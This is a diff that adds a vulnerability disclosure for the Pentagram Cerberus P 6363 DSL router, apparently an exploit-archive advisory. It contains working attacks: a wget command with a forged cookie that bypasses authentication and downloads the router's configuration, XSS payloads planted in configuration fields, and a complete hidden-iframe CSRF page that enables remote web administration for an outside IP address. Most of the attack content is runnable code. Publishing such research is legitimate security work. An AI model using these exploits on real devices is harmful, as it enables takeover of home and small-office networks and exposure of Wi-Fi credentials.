@@ -1,0 +1,193 @@
+PENTAGRAM Cerberus P 6363 DSL Router Multiple Vulnerabilities
+Found by condis
+
+Vendor Site / Model: http://www.pentagram.pl/produkty/cerberus-p-6363
+Firmware version: V5.07.28_PEN01 
+Software version: V3.0
+
+
+1. Prolog
+
+Cerberus P 6363 is simple SOHO class router. Its producer claims that it may act
+as a 4 port switch and has an advanced firewall (...)
+
+Device management is only possible through WWW GUI and because of that, GUI was 
+targeted and is subject of this raport.
+
+
+2. Authentication Bypass (CWE-592)
+
+This bug is really trivial. All we need to do is set up "special" cookie before 
+accessing GUI:
+
+condis@pandorum:~$ wget http://192.168.1.100/cgi-bin/DownloadCfg/RouterCfm.cfg -t 1 -nv -O pento.cfg
+2013-12-11 23:06:46 URL:http://192.168.1.100/login.asp [3663] -> "pento.cfg" [1]
+condis@pandorum:~$ head -n 5 pento.cfg 
+<html>
+<head>
+<META http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<title>PENTAGRAM Cerberus P 6363</title>
+<script type="text/javascript" src="lang/b28n.js"></script>
+
+and now lets try some voodoo magic :x 
+
+condis@pandorum:~$ wget http://192.168.1.100/cgi-bin/DownloadCfg/RouterCfm.cfg -t 1 -nv -O pento.cfg --header="Cookie: admin:language=en"
+condis@pandorum:~$ head -n 5 pento.cfg 
+#Please don't change this file by hand
+dhcp_static_lease3=
+sb/1/ofdm2gpo=0x66442200
+wl_radius_port=1812
+wl0.1_radius_port=1812
+
+
+3. Multiple Cross Site Scripting (CWE-79)
+
+GUI has some simple function that filters out non-alphanumeric characters but it 
+is written in JavaScript, and as we all know, implementing protection only on 
+client-side is no protection at all.
+
+One of attack methods would be to turn off JavaScript or write some simple scripts 
+(i.e.: using curl, wget, etc) that won't interpret JS code like web browser does.
+
+Second method (which is preferred by me) is to make configuration backup; modify 
+it manually changing relevant variables/directives and then reupload it back to 
+the device.
+
+
+3.1 Setting WI-FI Password 
+
+wl_wpa_psk=wifi_password";alert('XSS');//
+
+This code will be executed on index page.
+
+
+3.2 Setting URL Filtration
+
+filter_url0=192.168.1.12-192.168.1.13:bar,0-6,0-0,on,foo");alert('XSS');//
+
+If "filter_url_mode" is disabled, we must change it to "deny" or "pass". Code 
+injected here will be executed in Security Settings -> URL Filter Setting page.
+
+
+3.3 Setting MAC Address Filtration
+
+filter_mac0=DE:AD:DE:AD:DE:AD,0-6,0-0,on,gangbang');alert('xss');//
+
+If "filter_mac_mode" variable is disabled, we must change it to "deny" or "pass". 
+Code injected here will be executed in Security Settings -> MAC Address Filter 
+Settings.
+
+Probably there are more XSS flaws, but I stopped searching after those three...
+
+
+4. Cross Site Request Forgery (CWE-352)
+
+There is no mechanism preventing CSRF attacks by which it is possible to enforce
+any operation on the logged administrator. Below there is simple proof of concept
+which enables httpd to WAN (access from IP = 69.69.69.69) :
+
+
+----- cerber_csrf_poc.html -----------------------------------------------------
+
+<body><script>
+
+/**
+ *
+ * Cross Site Request Forger v1.1
+ * by condis
+ *
+ * Simple utility which aim is to help in 
+ * testing and exploiting CSRF flaws.
+ *
+ * If You don't know how to use it, then
+ * do NOT use it :)
+ *
+ */
+ 
+var CSRForger = function()
+{
+	var f = document.createElement('form');
+ 
+	var obj = {
+ 
+		'target' : '',
+		'method' : 'post',
+		'debug'  : false,
+ 
+		'addInput' : function(name, value) 
+		{
+			var i = document.createElement('input');
+ 
+			i.name  = name;
+			i.value = value;
+			i.type  = name == 'submit' ? 'submit' : (this.debug === 2) ? 'text' : 'hidden';
+ 
+			f.appendChild(i);
+		},
+ 
+ 
+		'addInputs' : function(post) 
+		{
+			for (var field in post) 
+				this.addInput(field, post[field]);
+		},
+ 
+ 
+		'csrForge' : function() 
+		{
+			f.method = (this.method == 'post') ? 'POST' : 'GET';
+			f.action = this.target;
+			f.target = "gangbang";
+ 
+			var i = document.createElement('iframe');
+ 
+			i.style.width  = '100%';
+			i.style.height = '500px';
+ 
+			if(this.debug === 0 || this.debug === false) 
+			{
+				f.style.display = 'none';
+				i.style.display = 'none';
+			}
+ 
+			i.name = f.target;
+			i.src  = f.action;
+ 
+			document.body.appendChild(f);
+			document.body.appendChild(i);
+ 
+			document.getElementsByName('submit').item(0).click();
+		} 
+	};
+ 
+	return obj;
+};
+
+var cerb = new CSRForger();
+
+cerb.target = 'http://192.168.1.100/goform/SafeWanWebMan';
+cerb.method = 'GET';
+
+cerb.addInputs({
+	'GO' 		: 'system_remote.asp',
+	'RMEN' 		: '1',
+	'port'		: '8080',
+	'IP' 		: '69.69.69.69', 
+	'submit'	: 'go go power rangers'
+});
+
+cerb.csrForge();
+</script></body>
+
+----- cerber_csrf_poc.html -----------------------------------------------------
+
+
+5. Epilogue
+
+I tried to estalish a dialogue with vendor (07.12.2013) but they didn't respond 
+for five days (probably they don't give a fuck about security) so I decided to 
+publish all bugs.
+
+Also, what's obvious there is no patch so best solution that I can think of now
+is to stop using P 6363 and try other version. (P 6362 has different firmware
+and at first glance it looked better).
